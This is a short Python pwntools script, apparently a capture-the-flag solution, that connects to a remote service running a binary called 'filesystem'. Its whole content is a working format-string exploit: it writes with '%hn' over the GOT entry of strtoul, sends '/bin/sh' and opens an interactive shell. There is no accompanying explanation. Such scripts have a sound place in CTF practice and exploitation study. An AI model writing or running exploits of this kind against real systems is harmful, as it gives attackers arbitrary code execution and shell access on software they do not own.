#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
# n = process('./filesystem')
n = remote('101.71.29.5',10017)
elf = ELF('./filesystem')

def choice(idx):
    n.recvuntil('> ')
    if idx == 1:
        n.sendline('Create')
    elif idx == 2:
        n.sendline('Edit')
    elif idx == 3:
        n.sendline('Read')
    elif idx == 4:
        n.sendline('Checksec')


offset = 8
payload = "aaaa%1970c%10$hn" + p64(elf.got['strtoul'])

n.recvuntil('> ')
# gdb.attach(n)
n.send(payload)
n.sendline('Read')
n.sendline('/bin/sh')

n.interactive()
